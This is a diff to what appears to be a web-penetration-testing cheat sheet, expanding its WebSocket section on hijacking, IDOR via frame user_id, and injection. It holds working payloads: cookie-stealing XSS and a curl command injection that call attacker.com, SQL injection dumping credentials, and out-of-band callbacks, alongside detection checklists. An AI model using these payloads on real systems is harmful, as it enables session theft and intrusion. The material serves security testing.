@@ -1273,8 +1273,11 @@ Cookie: session=VICTIM_TOKEN    ← stolen cookie → replay
 ```
 
 ### Cross-Site WebSocket Hijacking (CSWSH)
+
+**How it works:** The server trusts the `Cookie` header sent automatically by the browser on the WS upgrade request but never validates the `Origin` header. An attacker page at `evil.com` can open a WS connection that the server accepts as the victim, then read all streamed data.
+
 ```html
-<!-- No CSRF protection on WebSocket handshake → attacker page initiates WS as victim -->
+<!-- PoC: attacker-hosted page forces victim's browser to open WS as themselves -->
 <script>
   var ws = new WebSocket("wss://target.com/ws/account");
   ws.onmessage = function(e) {
@@ -1282,16 +1285,67 @@ Cookie: session=VICTIM_TOKEN    ← stolen cookie → replay
   };
 </script>
 ```
-**Precondition:** WebSocket upgrades only validated by `Cookie` (no `Origin` check)
-**Effect:** Attacker's page receives victim's private WebSocket messages
 
-### WebSocket Message Injection
+**Detection checklist:**
+- Open the WS upgrade request in Burp; remove or change the `Origin` header → server should reject with 403
+- If the server responds `101 Switching Protocols` regardless of Origin → vulnerable
+- Check `Sec-WebSocket-Protocol` header is present and validated (some servers require a matching subprotocol as implicit auth)
+
+**Precondition:** WS upgrades accepted from any Origin, auth via Cookie only
+**Effect:** Attacker page exfiltrates victim's real-time WS stream (account data, private messages, auth tokens)
+
+---
+
+### IDOR & Unauthorized Access via WebSocket Frames
+
+**How it works:** The server validates auth at HTTP handshake time but blindly trusts the `user_id` (or resource ID) field inside subsequent WS message frames — allowing any authenticated user to act on behalf of another.
+
 ```json
-// Test all message types for injection
-{"type": "message", "to": "OTHER_USER_ID", "body": "<script>alert(1)</script>"}
-{"type": "admin_command", "action": "delete_user", "user_id": "1"}
-{"type": "status", "online": true, "user_id": "VICTIM_ID"}  // Spoof other user's status
+// Escalate to admin action by swapping user_id in the frame payload
+{"user_id": 1337, "action": "delete"}
+{"user_id": 1337, "action": "read_profile"}
+{"user_id": 1337, "action": "export_data", "format": "csv"}
+
+// Test pre-auth: send action frames BEFORE the auth/hello frame
+{"type": "auth", "token": ""}           // empty/missing token
+{"user_id": 9999, "action": "list_all"} // follow immediately — server may not have enforced auth yet
 ```
+
+**Detection checklist:**
+- Intercept WS frames (Burp WebSockets tab); replay frames substituting other users' IDs
+- Test whether the server validates the session owner server-side or trusts the frame's `user_id` field
+- Check if unauthenticated connections are accepted before any `auth` frame is sent
+
+---
+
+### Injection via WebSocket (XSS / SQLi)
+
+**How it works:** WS message fields are processed server-side and may be rendered in admin dashboards, stored in the DB, or passed to shell commands — bypassing WAF rules that only inspect HTTP request bodies.
+
+```json
+// Stored XSS → fires when admin views the dashboard
+{"message": "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"}
+{"username": "<svg/onload=eval(atob('BASE64_PAYLOAD'))>"}
+
+// Blind SQLi — WAF won't see this, WS handler may pass it straight to a query
+{"search": "' OR 1=1--"}
+{"filter": "1 UNION SELECT username,password,null FROM users--"}
+
+// SSTI / command injection if WS feeds a templating or eval path
+{"template": "{{7*7}}"}
+{"cmd": "ping; curl https://attacker.com/$(whoami)"}
+```
+
+**Blind OOB confirmation (always use when output is not returned in the WS response):**
+```json
+{"message": "<script>new Image().src='https://BURP_COLLAB.oastify.com/'+document.cookie</script>"}
+{"search": "' AND (SELECT LOAD_FILE(0x5c5c5cBURPCOLLAB5c))--"}
+```
+
+**Detection checklist:**
+- Use Burp Collaborator / interactsh as OOB callback for every blind payload
+- Verify payloads reach admin-facing surfaces by checking if the dashboard renders untrusted WS content
+- Check whether the server sanitizes input differently over WS vs. REST endpoints on the same backend
 
 ---
 
